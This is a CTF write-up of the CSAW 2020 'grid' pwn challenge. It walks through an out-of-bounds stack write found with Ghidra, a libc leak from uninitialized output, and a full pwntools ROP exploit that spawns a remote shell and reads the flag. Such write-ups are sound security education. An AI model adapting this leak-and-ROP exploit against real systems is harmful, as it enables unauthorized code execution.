#  CSAW CTF Qualification Round 2020

## grid (postmortem)

> 150
> 
> After millions of bugs, all my homies hate C.
>
> `nc pwn.chal.csaw.io 5013` 
> 
> `libc-2.27 md5: 35ef4ffc9c6ad7ffd1fd8c16f14dc766`
>
> [`grid`](grid) [`libc-2.27.so`](libc-2.27.so) [`libstdc.so.6.0.25`](libstdc.so.6.0.25)

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _write-what-where_


## Summary

`grid` is a small ASCII drawing program that may crash if you draw outside the 10x10 _grid_.  This vulnerability can be exploited to gain execution control, a shell, and the flag.

> I did not complete this challenge before the end of the competition.  After reading a few write-ups, I realized I was wasting my time with the wrong leak. 


## Analysis

### Just run it

```
# ./grid
shape> a
loc> 0 0
placing a at 0, 0
shape> b
loc> 1 1
placing b at 1, 1
shape> c
loc> 2 2
placing c at 2, 2
shape> d
Displaying
a!`�!
`b�]�
� c:�0Q�

M=Q�`�
]��q0Q
�#�]��
1Q�
�
]���]�
```

It took a few minutes messing around to get this far.  Shape is just a single character that is not `d`.  Loc[cation] is the `x`/`y` coordinate for the shape.  You can make out the entered `abc` in a diagonal from the top-left.  You'll also notice uninitialized buffer output.  This will be our leak.


### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No Pie, easy ROP.  Partial RELRO, perhaps GOT-overwrite.


### Decompile with Ghidra


```c
void display(char *param_1)
{
  long in_FS_OFFSET;
  int local_88;
  int local_84;
  char *local_80;
  char acStack120 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_80 = param_1;
  while (local_80 != (char *)0x0) {
    acStack120[(long)(int)(uint)(byte)local_80[2] + (long)(int)(uint)(byte)local_80[1] * 10] = *local_80;
    local_80 = *(char **)(local_80 + 8);
  }
  operator<<<std--char_traits<char>>((basic_ostream *)cout,"Displaying\n");
  local_88 = 0;
  while (local_88 < 10) {
    local_84 = 0;
    while (local_84 < 10) {
      operator<<<std--char_traits<char>>((basic_ostream *)cout,acStack120[(long)local_84 + (long)local_88 * 10]);
      local_84 = local_84 + 1;
    }
    operator<<<std--char_traits<char>>((basic_ostream *)cout,"\n");
    local_88 = local_88 + 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

When `d` is submitted as the shape `display` is called and passed a pointer to a heap array of 3-tuples (shape, x, y).

This unbounded loop provides us a _write-what-where_ can we can easily use to write over the return address.

```
  while (local_80 != (char *)0x0) {
    acStack120[(long)(int)(uint)(byte)local_80[2] + (long)(int)(uint)(byte)local_80[1] * 10] = *local_80;
    local_80 = *(char **)(local_80 + 8);
  }
```

Character array `acStack120` is `120` bytes (Ghidra has some convenient naming conventions) from the return pointer, so `x`*10 + `y` >= 120 can be used to overwrite the return address.


### What to write?

The second loop in `display` _displays_ 100 bytes from the stack, the first 96 bytes can be decoded as:

```
[*] 0x60212b
[*] 0x6021c0
[*] 0x7ff0881be6e0
[*] 0x7ff087f345da
[*] 0x0
[*] 0x6021c0
[*] 0x7ff0881be6e0
[*] 0x7ff087f267cd
[*] 0x6021c0
[*] 0x7ff087f35ede
[*] 0x200000000
[*] 0x7ffebc0770c4
```

This will change with ASLR and between `d` invocations.  Best to get the leak first.  Testing each in GDB for the distance from libc has the 4th value consistently `0x4ec5da` from the base of libc (hat tip to [r4j0x00](https://github.com/r4j0x00/ctf-writeups/blob/master/csaw2020/grid/grid.py))


## Exploit

### Setup

```python
#!/usr/bin/env -S python3

from pwn import *

binary = context.binary = ELF('./grid')
context.log_level = 'INFO'

libpath = os.getcwd() + '/libc-database/libs/libc6_2.27-3ubuntu1.2_amd64/'
libc = ELF(libpath + 'libc-2.27.so')
libc.symbols['base_offset'] = 0x4ec5da

if not args.REMOTE:
    context.log_file = 'local.log'
    ld = ELF(libpath + 'ld-2.27.so')
    p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH':libpath, 'LD_PRELOAD':'./libstdc.so.6.0.25'})
else:
    context.log_file = 'remote.log'
    p = remote('pwn.chal.csaw.io', 5013)
```

Getting this running locally (postmortem) with the correct ld and libc made this a lot easier to understand and make progress.

First I needed to find the libc version using the libc provided:

```bash
# curl -X POST -H 'Content-Type: application/json' --data '{"md5": "'$(md5sum libc-2.27.so | awk '{print $1}')'"}' 'https://libc.rip/api/find'
[
  {
    "buildid": "d3cf764b2f97ac3efe366ddd07ad902fb6928fd7",
    "download_url": "https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so",
    "id": "libc6_2.27-3ubuntu1.2_amd64",
    "md5": "35ef4ffc9c6ad7ffd1fd8c16f14dc766",
    "sha1": "a22321cd65f28f70cf321614fdfd22f36ecd0afe",
    "sha256": "f0ad9639b2530741046e06c96270b25da2339b6c15a7ae46de8fb021b3c4f529",
    "symbols": {
      "__libc_start_main_ret": "0x21b97",
      "dup2": "0x110ab0",
      "printf": "0x64f00",
      "puts": "0x80a30",
      "read": "0x110180",
      "str_bin_sh": "0x1b40fa",
      "system": "0x4f4e0",
      "write": "0x110250"
    }
  }
]
```

From here I just linked `libc-database` into my working directory (Google for `libc-database`) and typed `./download libc6_2.27-3ubuntu1.2_amd64` from within that directory.  Now I have all the libs.

`p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH':libpath, 'LD_PRELOAD':'./libstdc.so.6.0.25'})` above will use the correct ld/libc.  As for debugging I used `gef -x script grid $(pidof ld-2.27.so)`.

From this setup with the correct libc it was easy to confirm the offset.


```python
p.sendlineafter('shape> ','d')
p.recvuntil('Displaying')
_ = p.recvuntil('shape').replace(b'shape',b'').strip().replace(b'\n',b'')
a = [_[i:i+8] for i in range(0,len(_),8)][:-1]
#for i in a: log.info(hex(u64(i)))
libc.address = u64(a[3]) - libc.sym.base_offset
log.info('libc.address: ' + hex(libc.address))
```

Above is the leak.


```python
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

base=120
for i in range(len(payload)):
    p.sendlineafter('> ',p8(payload[i]) + b' 0 ' + str(base + i).encode())

p.sendlineafter('shape> ','d')
p.recvuntil('Displaying\n')
p.recv(100 + 10)
p.interactive()
```

The rest is fairly straight forward.  The payload is not unlike most _get-a-shell-ROP_ pwns, however, using the `display` bug to move the payload into place vs BOF.  The base of 120 was determined from Ghidra (see above).  The loop sends the bytes to location `0 120 + i`.

> I should probably check for `d` in the payload as a _badchar_.  It does happen (thanks ASLR).  But I'm already 5 days behind on this writeup.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/csawquals2020/grid/grid'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/pwd/datajerk/csawquals2020/grid/libc-database/libs/libc6_2.27-3ubuntu1.2_amd64/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 5013: Done
[*] libc.address: 0x7fd671e4d000
[*] Loaded 17 cached gadgets for './grid'
[*] Switching to interactive mode
$ id
uid=1000(grid) gid=1000(grid) groups=1000(grid)
$ ls -l
total 16
-r--r----- 1 root grid    30 Sep 10 23:33 flag.txt
-r-xr-xr-x 1 root grid 10336 Sep 10 23:33 grid
$ cat flag.txt
flag{but_4ll_l4ngu4g3s_R_C:(}
```
